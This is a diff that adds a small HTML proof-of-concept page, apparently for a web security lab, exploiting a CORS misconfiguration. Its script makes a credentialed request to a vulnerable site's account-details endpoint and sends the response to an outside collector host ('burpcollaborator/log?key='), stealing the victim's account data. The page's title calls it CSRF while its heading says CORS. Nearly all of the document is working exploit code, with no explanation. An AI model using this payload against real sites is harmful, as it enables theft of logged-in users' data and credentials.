@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF PoC</title>
+</head>
+<body>
+    <h1>CORS Proof of Concept</h1>
+<script>
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://vuln/accountDetails',true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+   location='https://burpcollaborator/log?key='+this.responseText;
+};
+</script>
+</body>
+</html>
